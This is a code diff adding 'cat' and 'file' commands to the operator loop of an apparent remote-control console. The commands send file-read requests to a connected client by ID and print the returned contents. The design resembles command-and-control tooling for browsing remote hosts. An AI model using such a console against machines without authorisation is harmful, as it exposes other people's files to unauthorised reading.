@@ -980,6 +980,31 @@ def interaction_loop(client_id, hostname):
         elif cmd == "pwd":
             print(f"{CYAN}{CURRENT_PATH}{RESET}")
 
+        elif cmd == "cat":
+            if not arg:
+                print(f"{RED}[错误]{RESET} 用法：cat <文件>")
+                continue
+            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
+            send_command(client_id, "cat", full_path)
+            results = wait_for_result(client_id)
+            if results:
+                for r in results:
+                    if r.get("result_type") == "file_content":
+                        print(f"{CYAN}{r.get('result', '')}{RESET}")
+                    else:
+                        print_failed_result(r)
+            else:
+                print(f"{RED}[错误]{RESET} 无法读取文件")
+
+        elif cmd == "file":
+            if not arg:
+                print(f"{RED}[错误]{RESET} 用法：file <文件路径>")
+                continue
+            send_command(client_id, "file", arg)
+            results = wait_for_result(client_id)
+            if results:
+                print_failed_result(results[0])
+
         elif cmd == "cd":
             if not arg:
                 print(f"{RED}[错误]{RESET} 用法: cd <目录>")
